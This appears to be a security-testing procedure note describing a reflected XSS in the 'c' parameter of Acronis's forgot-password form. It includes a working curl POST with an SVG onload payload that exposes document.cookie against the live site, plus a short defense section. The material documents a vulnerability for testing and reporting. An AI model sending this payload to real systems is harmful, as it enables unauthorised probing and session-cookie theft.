---
id: test-xss-acronis-2024
tags:
  - xss
  - reflected-xss
  - web
  - testing
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-post-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:43.096Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Test-Reflected-XSS-in-Forgot-Password-Form

## Summary

This procedure tests for a reflected XSS vulnerability in the 'c' parameter of the Acronis forgot password form by submitting a crafted payload via POST request, observing if the input is unsanitized and reflected back, allowing JavaScript execution.

## Description

In the context of the Acronis website, the forgot password form at /en-us/my/remind/index.html processes user input in parameters like 'c' without proper sanitization or output encoding. By injecting a payload such as '1"<!--><Svg OnLoad=(confirm)(document.cookie)<!--', the attacker can close HTML tags and inject an SVG element that executes JavaScript on load. This is particularly dangerous in a reflected context where the response is rendered in the browser. Prerequisites include basic web knowledge and access to curl or a similar tool for HTTP requests. Expected outcomes include confirmation of the vulnerability via alert or console output showing cookie data.

## Requirements

1. Internet access to https://www.acronis.com
2. curl installed for POST requests
3. Web browser to inspect responses if needed

## Defense

Defensive measures and detection strategies:

- Implement input validation and output encoding (e.g., HTML entity encoding) for all user inputs
- Use Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous POST requests to the form endpoint with suspicious payloads

## Objectives

1. Confirm reflected XSS vulnerability in the 'c' parameter
2. Demonstrate JavaScript execution capability
3. Collect proof-of-concept evidence for reporting

## Instructions

### Step 1: Submit POST Request with XSS Payload

**Context**: Craft and send a POST request to the forgot password endpoint, injecting the payload into the 'c' parameter to test reflection and execution.

**Command** ([[commands/curl-post-xss-payload]]):
```bash
curl -X POST https://www.acronis.com/en-us/my/remind/index.html \
  -d "token=a016902ceaeb6ae91c21302631fbbcfc" \
  -d "SN=818198181891891981981981516518198198" \
  -d "OrderId=" \
  -d "Submit=Send E-mail" \
  -d "c=1\"<!--><Svg OnLoad=(confirm)(document.cookie)<!--"
```

> This command sends the required form parameters along with the XSS payload. If vulnerable, the response will reflect the payload, and in a browser context, it will execute the SVG onload to alert document.cookie.

### Step 2: Inspect Response

**Context**: Review the HTTP response for the reflected payload to confirm lack of sanitization.

Use browser dev tools or pipe curl output to a file for analysis.

**Command** (save output):
```bash
curl ... > response.html
```

> Open response.html in a browser to see if the JavaScript executes.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-post-xss-payload]]

## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[web]]
- [[testing]]
